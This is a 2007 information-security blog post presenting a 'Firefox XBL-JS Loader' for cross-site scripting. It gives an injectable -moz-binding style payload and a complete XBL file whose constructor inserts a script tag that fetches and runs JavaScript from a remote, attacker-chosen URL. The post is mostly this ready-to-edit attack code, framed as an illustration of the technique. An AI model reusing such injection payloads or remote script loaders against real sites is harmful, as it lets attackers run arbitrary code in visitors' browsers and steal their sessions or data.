---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2007/05/15/firefox-xbl-js-loader-v1-0
categories:
- Information Security
comments: []
date: 2007-05-15 13:41:55 +0200
date_gmt: 2007-05-15 13:41:55 +0200
doi: https://doi.org/10.59348/2h3ng-xtv52
roguescholar: https://rogue-scholar.org/records/a34xa-r2x80
atproto: at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mocbqo72t
image:
  feature: geek.png
layout: post
ogImage: images/geek.png
published: true
status: publish
tags:
- information security
title: Firefox XBL-JS Loader v1.0
wordpress_id: 294
wordpress_url: http://pro.grammatic.org/post-firefox-xbljs-loader-v10-4.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mocbqo72t"
kcworks: https://works.hcommons.org/records/t9hwt-a4w46
references:
- http://site.com/STXSS_XBL.xml#loader # Illustrative STXSS XBL loader payload URL
- title: Mozilla XML Namespace
  type: WebPage
  url: http://www.mozilla.org/xbl
  isPartOf:
    name: Mozilla
    type: WebSite
---

<p>Today I wrote a simple tool to illustrate the binding of a Javascript document to a page using Firefox's XBL support (-moz-binding) in an XSS context.</p>
<p>The process works as follows:</p>
<ol>
<li>Inject attributes as follows (different encodings may be necessary): &lt;element style = "-moz-binding:url('http://site.com/STXSS_XBL.xml#loader');" /&gt;.</li>
<li>Browser loads XBL document.</li>
<li>XBL document modifies DOM to include &lt;script src="evil_script.js"/&gt;.</li>
<li>Browser loads and parses Javascript.</li>
</ol>
<p>The required XBL document (STXSS_XBL.xml) is as follows:</p>

{% highlight xml %}
<?xml version="1.0"?>
<bindings xmlns="http://www.mozilla.org/xbl">
    <binding id="loader">
        <implementation>
            <constructor>
                <![CDATA[
                    //This is the STXSS XBL Loader
                    //Edit this line to the URL of the STXSS Javascript
                    var url = "http://www.your-site.com/STXSS_JS.js";
                    //Do not edit below this line
                    var scr = document.createElement("script");
                    scr.setAttribute("src",url);
                    var bodyElement = document.getElementsByTagName("html").item(0);
                    bodyElement.appendChild(scr);
                 ]]>
            </constructor>
        </implementation>
    </binding>
</bindings>
{% endhighlight %}